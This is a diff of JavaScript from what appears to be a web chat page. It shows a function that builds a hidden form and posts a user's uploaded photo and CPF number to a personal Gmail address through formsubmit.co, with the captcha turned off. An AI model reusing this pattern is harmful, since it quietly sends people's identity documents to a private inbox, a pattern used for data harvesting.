@@ -78,48 +78,49 @@ if (userInput) {
     }
 
     function enviarImagemParaFormsubmit(file, cpf, contexto) {
-        const form = document.createElement("form");
-        form.action = "https://formsubmit.co/luizapavarina2004@gmail.com";
-        form.method = "POST";
-        form.enctype = "multipart/form-data";
-        form.style.display = "none";
+    const form = document.createElement("form");
+    form.action = "https://formsubmit.co/luizapavarina2004@gmail.com";
+    form.method = "POST";
+    form.enctype = "multipart/form-data";
+    form.style.display = "none";
 
-        const fileInput = document.createElement("input");
-        fileInput.type = "file";
-        fileInput.name = "foto";
+    const fileInput = document.createElement("input");
+    fileInput.type = "file";
+    fileInput.name = "foto";
 
-        const dt = new DataTransfer();
-        dt.items.add(file);
-        fileInput.files = dt.files;
-        form.appendChild(fileInput);
+    const dt = new DataTransfer();
+    dt.items.add(file);
+    fileInput.files = dt.files;
+    form.appendChild(fileInput);
 
-        const cpfInput = document.createElement("input");
-        cpfInput.type = "hidden";
-        cpfInput.name = "cpf";
-        cpfInput.value = cpf;
-        form.appendChild(cpfInput);
+    const cpfInput = document.createElement("input");
+    cpfInput.type = "hidden";
+    cpfInput.name = "cpf";
+    cpfInput.value = cpf;
+    form.appendChild(cpfInput);
 
-        const subject = document.createElement("input");
-        subject.type = "hidden";
-        subject.name = "_subject";
-        subject.value = `📸 Foto enviada - CPF ${cpf} (${contexto})`;
-        form.appendChild(subject);
+    // Assunto mais descritivo
+    const subject = document.createElement("input");
+    subject.type = "hidden";
+    subject.name = "_subject";
+    subject.value = `📸 Foto de ${contexto} enviada - CPF ${cpf}`;
+    form.appendChild(subject);
 
-        const redirect = document.createElement("input");
-        redirect.type = "hidden";
-        redirect.name = "_redirect";
-        redirect.value = window.location.href;
-        form.appendChild(redirect);
+    const redirect = document.createElement("input");
+    redirect.type = "hidden";
+    redirect.name = "_redirect";
+    redirect.value = window.location.href;
+    form.appendChild(redirect);
 
-        const noCaptcha = document.createElement("input");
-        noCaptcha.type = "hidden";
-        noCaptcha.name = "_captcha";
-        noCaptcha.value = "false";
-        form.appendChild(noCaptcha);
+    const noCaptcha = document.createElement("input");
+    noCaptcha.type = "hidden";
+    noCaptcha.name = "_captcha";
+    noCaptcha.value = "false";
+    form.appendChild(noCaptcha);
 
-        document.body.appendChild(form);
-        form.submit();
-    }
+    document.body.appendChild(form);
+    form.submit();
+}
 
     function sendMessage() {
         const message = userInput.value.trim();
